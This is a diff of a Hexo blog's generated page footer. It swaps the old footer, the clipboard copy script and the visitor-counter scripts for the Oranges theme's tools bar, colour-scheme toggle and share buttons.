+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
 </div>
 
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
         
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2025-2026
-    Rufeii
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
   </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <li><a href="/">h0me</a></li><li><a href="/about/">ab0ut</a></li><li><a href="/categories/">categ0ries</a></li><li><a href="/links/">links</a></li><li><a href="/search/">Search</a></li>
-      </ul>
-      <ul>
-            
-              <span id="busuanzi_container_site_pv">
-                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
-              </span>
-              <span class="post-meta-divider">|</span>
-              <span id="busuanzi_container_site_uv" style='display:none'>
-                      本站访客数<span id="busuanzi_value_site_uv"></span>人
-              </span>
-              
-            
-      </ul>
-    </nav>
-  </div>
-</footer>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89 + '&url=' + https%3A%2F%2Frufeii.github.io%2F2025%2F11%2F02%2F%25E6%2588%2590%25E9%2583%25BD%25E5%25A4%25A7%25E5%25AD%25A6%25E7%25AC%25AC%25E5%2585%25AB%25E5%25B1%258A%25E7%258E%2584%25E6%25AD%25A6%25E6%259D%25AF%25EF%25BC%2588ak%25EF%25BC%2589%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://rufeii.github.io/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
     </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
   
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+<script src="/js/shares.js"></script>
 
 
-<script src="/js/main.js"></script>
 
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
-
-
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-</body>
+      </div>
+    </div>
+  </body>
 </html>
